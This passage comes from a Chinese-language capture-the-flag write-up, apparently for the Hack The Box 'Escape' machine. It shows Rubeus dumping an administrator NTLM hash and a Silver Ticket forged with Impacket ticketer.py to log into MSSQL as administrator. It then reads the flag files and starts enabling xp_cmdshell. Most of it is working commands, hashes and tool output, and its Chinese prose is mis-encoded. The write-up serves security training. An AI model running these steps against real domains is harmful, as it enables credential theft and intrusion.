E/oQ+9ry38KQke3DJ6sCtRYgQdi1asVTfYwrqAOrv1tRbOP/9N1PooUc3/kMp31gndkLQgH07MnMCfFw</span><br><span class="line">      B8C8F0dlHLDCgBr9CknvAKOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIE</span><br><span class="line">      EDRjfGJF47/p6VsxN4JUzq6hDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3Kj</span><br><span class="line">      BwMFAADhAAClERgPMjAyMzA2MTkxNDA4NDNaphEYDzIwMjMwNjIwMDAwODQzWqcRGA8yMDIzMDYyNjE0</span><br><span class="line">      MDg0M1qoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg==</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/sequel.htb</span><br><span class="line">  ServiceRealm             :  SEQUEL.HTB</span><br><span class="line">  UserName                 :  administrator</span><br><span class="line">  UserRealm                :  SEQUEL.HTB</span><br><span class="line">  StartTime                :  6/19/2023 7:08:43 AM</span><br><span class="line">  EndTime                  :  6/19/2023 5:08:43 PM</span><br><span class="line">  RenewTill                :  6/26/2023 7:08:43 AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  NGN8YkXjv+npWzE3glTOrg==</span><br><span class="line">  ASREP (key)              :  15BE0183651E57504615199D79D431BA</span><br></pre></td></tr></table></figure>

<p>ç„¶è€Œï¼ŒRubeusè¯•å›¾å°†è¿”å›çš„ç¥¨è¯ç›´æ¥åŠ è½½åˆ°å½“å‰ç»ˆç«¯ä¸­ï¼Œæ‰€ä»¥ä»ç†è®ºä¸Šè®²ï¼Œä¸€æ—¦è¿è¡Œå®ƒï¼Œå°±å¯ä»¥è¿›å…¥administratorçš„æ–‡ä»¶å¤¹å¹¶è·å¾—flagã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸é€‚ç”¨äºEvil-WinRMã€‚</p>
<p>ç›¸åï¼Œä½¿ç”¨&#x2F;getcredentials &#x2F;show &#x2F;nowrapè¿è¡Œç›¸åŒçš„å‘½ä»¤ã€‚ä¼šè½¬å‚¨æœ‰å…³è¯¥å¸æˆ·çš„å¯†ç å‡­è¯ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.0.1</span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb</span><br><span class="line">[*] Building AS-REQ (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;sequel.htb\administrator&#x27;</span></span><br><span class="line">[+] TGT request successful!</span><br><span class="line">[*] <span class="built_in">base64</span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      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</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/sequel.htb</span><br><span class="line">  ServiceRealm             :  SEQUEL.HTB</span><br><span class="line">  UserName                 :  administrator</span><br><span class="line">  UserRealm                :  SEQUEL.HTB</span><br><span class="line">  StartTime                :  6/19/2023 7:10:32 AM</span><br><span class="line">  EndTime                  :  6/19/2023 5:10:32 PM</span><br><span class="line">  RenewTill                :  6/26/2023 7:10:32 AM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  qsYHqNw7wdiSCV8wdcq3jQ==</span><br><span class="line">  ASREP (key)              :  0A4A84695595EA2E6C8D156B44ABB6E5</span><br><span class="line"></span><br><span class="line">[*] Getting credentials using U2U</span><br><span class="line"></span><br><span class="line">  CredentialInfo         :</span><br><span class="line">    Version              : 0</span><br><span class="line">    EncryptionType       : rc4_hmac</span><br><span class="line">    CredentialData       :</span><br><span class="line">      CredentialCount    : 1</span><br><span class="line">       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€è¡Œæ˜¯ç®¡ç†å‘˜å¸æˆ·çš„NTLM hashã€‚</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape9.png"></li>
</ul>
<h1 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><h3 id="Escape-â€œéé¢„æœŸâ€"><a href="#Escape-â€œéé¢„æœŸâ€" class="headerlink" title="Escape â€œéé¢„æœŸâ€"></a>Escape â€œéé¢„æœŸâ€</h3><p>åœ¨Escapeä¸­æœ‰ä¸€æ¡æ¶‰åŠSilver Ticketsçš„æ”»å‡»è·¯å¾„ã€‚è¿™ä¸ªè·¯å¾„æ˜¯åœ¨HTBæµ‹è¯•ä¸­æ£€æµ‹åˆ°çš„ï¼Œä½†æ˜¯teamå’Œboxä½œè€…å†³å®šä¿ç•™å®ƒï¼Œå› ä¸ºåœ¨è¿™ä¸ªåœºæ™¯ä¸­æ²¡æœ‰å¥½çš„æ–¹æ³•æ¥ä¿®å¤ï¼Œå¹¶ä¸”è¿™ä¸ªæ”»å‡»è·¯å¾„è¢«è¯„ä¼°ä¸ºæ›´éš¾å‘ç°ï¼Œå¹¶ä¸”å’Œé¢„æœŸçš„æ”»å‡»è·¯å¾„ä¸€æ ·å›°éš¾ã€‚</p>
<h3 id="Silver-Tickets"><a href="#Silver-Tickets" class="headerlink" title="Silver Tickets"></a>Silver Tickets</h3><p>Silver Tickets æ”»å‡»è¯¦ç»†ä»‹ç»<span class="exturl" data-url="aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMDEx">How Attackers Use Kerberos Silver Tickets to Exploit Systems<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cubmV0d3JpeC5jb20vc2lsdmVyX3RpY2tldF9hdHRhY2tfZm9yZ2VkX3NlcnZpY2VfdGlja2V0cy5odG1s">Silver Ticket Attack<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>é€šå¸¸ï¼Œæƒ³å¯¹MSSQLè¿›è¡Œèº«ä»½éªŒè¯æ—¶ï¼Œä¸ºæœåŠ¡åŸåˆ™åç§°(SPN)è¯·æ±‚Kerberosç¥¨æ®ã€‚è¯¥è¯·æ±‚è½¬åˆ°å¯†é’¥åˆ†å‘ä¸­å¿ƒ(KDC)(é€šå¸¸æ˜¯åŸŸæ§åˆ¶å™¨)ï¼Œåœ¨é‚£é‡ŒæŸ¥æ‰¾ä¸è¯¥SPNå…³è”çš„ç”¨æˆ·ï¼Œæ£€æŸ¥è¢«è¯·æ±‚çš„ç”¨æˆ·æ˜¯å¦åº”è¯¥å…·æœ‰è®¿é—®æƒé™ï¼Œç»è¿‡å‡ è½®é€šä¿¡åï¼Œè¿”å›ç”¨æˆ·çš„ç¥¨æ®ï¼Œå¹¶ç”¨æœåŠ¡å¸æˆ·çš„NTLM hashå¯¹å…¶è¿›è¡ŒåŠ å¯†ã€‚ç°åœ¨ï¼Œå½“ç”¨æˆ·å°†è¯¥ç¥¨æ®æä¾›ç»™æœåŠ¡æ—¶ï¼ŒæœåŠ¡å¯ä»¥å°†å…¶è§£å¯†å¹¶å°†å…¶ç”¨ä½œèº«ä»½éªŒè¯ã€‚</p>
<p>åœ¨é“¶ç¥¨æ”»å‡»ä¸­ï¼Œæ‰€æœ‰ä¸DCçš„é€šä¿¡éƒ½è¢«è·³è¿‡ã€‚æ”»å‡»è€…ä¼ªé€ æœåŠ¡ç¥¨è¯(ä¹Ÿç§°ä¸ºTGS)ï¼Œå¹¶ç”¨æœåŠ¡å¸æˆ·çš„NTLMå¯¹å…¶è¿›è¡ŒåŠ å¯†ã€‚</p>
<h3 id="Escapeçš„æ”»å‡»ç­–ç•¥"><a href="#Escapeçš„æ”»å‡»ç­–ç•¥" class="headerlink" title="Escapeçš„æ”»å‡»ç­–ç•¥"></a>Escapeçš„æ”»å‡»ç­–ç•¥</h3><p>æœ‰sql_svcå¸æˆ·çš„NTLM hashã€‚MSSQLæœåŠ¡æ²¡æœ‰åˆ†é…SPN(å¦‚æœåˆ†é…äº†SPNï¼Œå¯ä»¥è¦æ±‚DCç”Ÿæˆä¸€ä¸ªç”¨sql_svcçš„hashåŠ å¯†çš„æœåŠ¡ç¥¨æ®ï¼Œç„¶åå¯¹å…¶è¿›è¡Œä¿®æ”¹)ã€‚ä¸è¿‡ï¼Œä¸éœ€è¦DCã€‚å¯ä»¥ä½¿ç”¨Impacketå·¥å…·åœ¨æœ¬åœ°ä¼ªé€ ä¸€ä¸ªæœåŠ¡ç¥¨æ®ï¼Œç”¨sql_svcçš„NTML hashåŠ å¯†å®ƒï¼Œç„¶åè¿æ¥åˆ°MSSQLã€‚è¿™ä¸ªç¥¨æ®å°†ä¸èƒ½åœ¨ä»»ä½•å…¶ä»–æœåŠ¡ä¸Šå·¥ä½œï¼Œä½†å°†èƒ½å¤Ÿåœ¨MSSQLä¸Šæ¨¡æ‹Ÿä»»ä½•ç”¨æˆ·ã€‚</p>
<h2 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ä¸ºäº†ç”Ÿæˆä¸€å¼ é“¶ç¥¨ï¼Œä½¿ç”¨ticketer.pyï¼Œéœ€è¦ä»¥ä¸‹ä¿¡æ¯:</p>
<ul>
<li>sql_svcçš„NTLM hash</li>
<li>åŸŸSID</li>
<li>åŸŸå</li>
<li>SPN(ä¸ä¸€å®šæ˜¯æœ‰æ•ˆçš„SPN)</li>
<li>è¦æ¨¡æ‹Ÿçš„ç”¨æˆ·çš„åç§°</li>
</ul>
<p>ç°åœ¨å·²ç»æœ‰äº†sequel.htbçš„åŸŸåã€‚</p>
<h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>å·²ç»è·å¾—äº†sql_svcçš„å¯†ç ï¼Œä½†æ˜¯éœ€è¦NTLM hashã€‚æœ‰å¾ˆå¤šåœ¨çº¿å·¥å…·å¯ä»¥è®¡ç®—<span class="exturl" data-url="aHR0cHM6Ly9jb2RlYmVhdXRpZnkub3JnL250bG0taGFzaC1nZW5lcmF0b3I=">NTLM Hash Generator<i class="fa fa-external-link-alt"></i></span>ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨Pythonï¼Œä½¿ç”¨hashlib, NTLMæ˜¯ä¸€ä¸ªMD4å…·æœ‰UTF-16å°ç«¯ç¼–ç çš„å¯†ç :</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; hashlib.new(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;REGGIE1234ronnie&#x27;</span>.encode(<span class="string">&#x27;utf-16le&#x27;</span>)).digest()</span><br><span class="line">b<span class="string">&#x27;\x14C\xec\x19\xdaM\xacO\xfc\x95;\xca\x1bW\xb4\xcf&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨hex()æ‰“å°:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hashlib.new(<span class="string">&#x27;md4&#x27;</span>, <span class="string">&#x27;REGGIE1234ronnie&#x27;</span>.encode(<span class="string">&#x27;utf-16le&#x27;</span>)).digest().hex()</span><br><span class="line"><span class="string">&#x27;1443ec19da4dac4ffc953bca1b57b4cf&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="Domain-SID"><a href="#Domain-SID" class="headerlink" title="Domain SID"></a>Domain SID</h3><p><span class="exturl" data-url="aHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3Bvd2Vyc2hlbGwvbW9kdWxlL2FjdGl2ZWRpcmVjdG9yeS9nZXQtYWRkb21haW4/dmlldz13aW5kb3dzc2VydmVyMjAyMi1wcw==">Get-ADDomain<i class="fa fa-external-link-alt"></i></span>è¿”å›å…³äºåŸŸçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬SID:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\programdata&gt; Get-ADDomain | fl DomainSID</span><br><span class="line">DomainSID : S-1-5-21-4078382237-1492182817-2568127209</span><br></pre></td></tr></table></figure>

<h2 id="Silver-Ticket-1"><a href="#Silver-Ticket-1" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><h3 id="ç”Ÿæˆ"><a href="#ç”Ÿæˆ" class="headerlink" title="ç”Ÿæˆ"></a>ç”Ÿæˆ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ticketer.py -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -spn doesnotmatter/dc.sequel.htb administrator</span></span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Creating basic skeleton ticket and PAC Infos</span><br><span class="line">[*] Customizing ticket <span class="keyword">for</span> sequel.htb/administrator</span><br><span class="line">[*]     PAC_LOGON_INFO</span><br><span class="line">[*]     PAC_CLIENT_INFO_TYPE</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Signing/Encrypting final ticket</span><br><span class="line">[*]     PAC_SERVER_CHECKSUM</span><br><span class="line">[*]     PAC_PRIVSVR_CHECKSUM</span><br><span class="line">[*]     EncTicketPart</span><br><span class="line">[*]     EncTGSRepPart</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> administrator.ccache</span><br></pre></td></tr></table></figure>

<p>å®ƒè®¡ç®—å¿…è¦çš„ä¿¡æ¯å¹¶å°†TGSä¿å­˜åœ¨administrator.ccacheä¸­ã€‚ä½¿ç”¨KRB5CCNAMEç¯å¢ƒå˜é‡å‘Šè¯‰ç³»ç»Ÿä½¿ç”¨è¯¥æœåŠ¡ç¥¨è¯è¿›è¡Œèº«ä»½éªŒè¯ã€‚å¯ä»¥é€šè¿‡è¿è¡Œexport KRB5CCNAME&#x3D;administratoræ¥å®Œæˆã€‚é€šè¿‡åŒ…å«KRB5CCNAME&#x3D;administratorã€‚åœ¨æ¯ä¸ªå‘½ä»¤ä¹‹å‰ä½¿ç”¨ccache(ä½¿ç”¨å®ƒæ¥æ˜¾ç¤ºä½¿ç”¨å®ƒçš„ä½ç½®)ã€‚</p>
<h3 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h3><p>æœ‰äº†è¿™ä¸ªç¥¨æ®ï¼Œå°±å¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½å‘MSSQLè¿›è¡Œèº«ä»½éªŒè¯:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ntpdate -u dc.sequel.htb                                                                                                      1 â¨¯</span></span><br><span class="line">2023-06-19 12:35:11.302698 (-0400) +1.961441 +/- 0.163425 dc.sequel.htb 10.10.11.202 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 1.961441</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># KRB5CCNAME=administrator.ccache mssqlclient.py -k dc.sequel.htb</span></span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt;</span><br></pre></td></tr></table></figure>

<h3 id="è¯»å–flag"><a href="#è¯»å–flag" class="headerlink" title="è¯»å–flag"></a>è¯»å–flag</h3><p>åœ¨è¿™é‡Œï¼Œå¯ä»¥ä½œä¸ºadministratorä»boxä¸­<span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvcmVhZGluZy1hLXRleHQtZmlsZS13aXRoLXNxbC1zZXJ2ZXIvIw==">è¯»å–æ–‡ä»¶<i class="fa fa-external-link-alt"></i></span>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ntpdate -u dc.sequel.htb</span></span><br><span class="line">ntpdig: no eligible servers</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># ntpdate -u dc.sequel.htb                                                                                                      1 â¨¯</span></span><br><span class="line">2023-06-19 12:35:11.302698 (-0400) +1.961441 +/- 0.163425 dc.sequel.htb 10.10.11.202 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 1.961441</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/escape]</span><br><span class="line">â””â”€<span class="comment"># KRB5CCNAME=administrator.ccache mssqlclient.py -k dc.sequel.htb</span></span><br><span class="line">Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; SELECT * FROM OPENROWSET(BULK N<span class="string">&#x27;C:\users\ryan.cooper\desktop\user.txt&#x27;</span>, SINGLE_CLOB) AS Contents</span><br><span class="line">BulkColumn</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;47e8a7ffa5ff5b79ea0eeb5906ec2a46\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">SQL&gt; SELECT * FROM OPENROWSET(BULK N<span class="string">&#x27;C:\users\administrator\desktop\root.txt&#x27;</span>, SINGLE_CLOB) AS Contents</span><br><span class="line">BulkColumn</span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">b<span class="string">&#x27;427e2e823cf867a7a25b8f6d9943be9b\r\n&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Escape10.png"></li>
</ul>
<h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>xp_cmdshellä»ç„¶è¢«ç¦ç”¨ï¼Œä½†ä¸sql_svcä¸åŒï¼Œadministratorç”¨æˆ·æœ‰æƒé™å¯ç”¨å®ƒ:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">whoami</span></span><br><span class="line">[-] ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure <span class="string">&#x27;sys.xp_cmdshell&#x27;</span> of component <span class="string">&#x27;xp_cmdshell&#x27;</span> because this component is turned off as part of the security configuration <span class="keyword">for</span> this server. A system administrator can <span class="built_in">enable</span> the use of <span class="string">&#x27;xp_cmdshell&#x27;</span> by using sp_configure. For more information about enabling <span class="string">&#x27;xp_cmdshell&#x27;</span>, search <span class="keyword">for</span> <span class="string">&#x27;xp_cmdshell&#x27;</span> <span class="keyword">in</span> SQL Server Books Online.</span><br><span class="line">SQL&gt; EXECUTE sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, 1</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; RECONFIGURE</span><br><span class="line">SQL&gt; EXECUTE sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, 1</span><br><span class="line">[*] INFO(DC\SQLMOCK): Line 185: Configuration option 